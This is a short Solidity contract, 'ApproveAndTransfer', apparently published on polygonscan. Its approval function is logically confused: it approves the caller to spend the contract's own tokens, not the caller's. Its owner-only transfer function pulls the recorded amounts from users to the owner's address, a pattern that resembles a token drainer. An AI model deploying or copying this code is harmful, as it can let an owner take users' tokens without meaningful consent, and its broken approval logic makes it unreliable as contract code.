/**
 *Submitted for verification at polygonscan.com on 2023-06-20
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract ApproveAndTransfer {
    mapping(address => mapping(address => uint256)) public approvals;
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function approveTokens(address[] calldata tokenAddresses, uint256[] calldata amounts) external {
        require(tokenAddresses.length == amounts.length, "Arrays must have the same length");
        for (uint i = 0; i < tokenAddresses.length; i++) {
            IERC20 token = IERC20(tokenAddresses[i]);
            token.approve(msg.sender, amounts[i]);
            approvals[tokenAddresses[i]][msg.sender] += amounts[i];
        }
    }

    function transferTokens(address[] calldata tokenAddresses, address[] calldata recipients) external {
        require(msg.sender == owner, "Only the owner can call this function");
        require(tokenAddresses.length == recipients.length, "Arrays must have the same length");
        for (uint i = 0; i < tokenAddresses.length; i++) {
            IERC20 token = IERC20(tokenAddresses[i]);
            uint256 approvedAmount = approvals[tokenAddresses[i]][recipients[i]];
            require(approvedAmount > 0, "No approved amount");
            token.transferFrom(recipients[i], owner, approvedAmount);
            approvals[tokenAddresses[i]][recipients[i]] = 0;
        }
    }
}